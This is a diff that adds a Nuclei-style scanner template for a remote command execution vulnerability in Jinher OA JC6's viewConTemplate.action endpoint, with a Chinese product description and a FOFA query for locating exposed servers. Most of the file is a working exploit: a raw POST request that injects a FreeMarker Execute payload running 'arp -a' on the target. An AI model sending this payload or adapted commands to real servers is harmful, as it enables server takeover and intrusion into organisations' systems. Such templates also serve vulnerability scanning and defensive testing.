@@ -1,0 +1,49 @@
+id: JingHeOAJC6-viewConTemplate-RCE
+
+info:
+  name: 金和OAJC6-viewConTemplate-远程命令执行漏洞
+  author: candada
+  severity: critical
+  description: '金和JCS协同管理应用软件采用了精确管理模型的最新指导思路，充分融入现代企业的管理科学精髓，通过结合最新的信息化技术，从而更高效的帮助客户开展业务、管理企业，提高效率。JCS除了显著的“集团化应用”的特色外，还具有灵活易用的“信息门户应用”功能，可以根据个人需求，定制灵活的个性化工作台，全面体现了金和JCS以人为本、管理精确的理念。其viewConTemplate.action接口存在命令执行漏洞，可能导致服务器被攻击者接管。'
+  reference:
+  - https://mp.weixin.qq.com/s/Bt4ZRkeemqcHnBtZsV5zzQ
+  tags: 2024,金和OA,RCE
+  metadata:
+    max-request: 1
+    fofa-query: 'body="/jc6/platform/index/styles"'
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:   
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 98
+
+    moduId=1&code=<VulnTest>${"freemarker.template.utility.Execute"?new()("arp+-a")}</VulnTest>&uuid=1
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<VulnTest>'
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-04-29 14:33:27
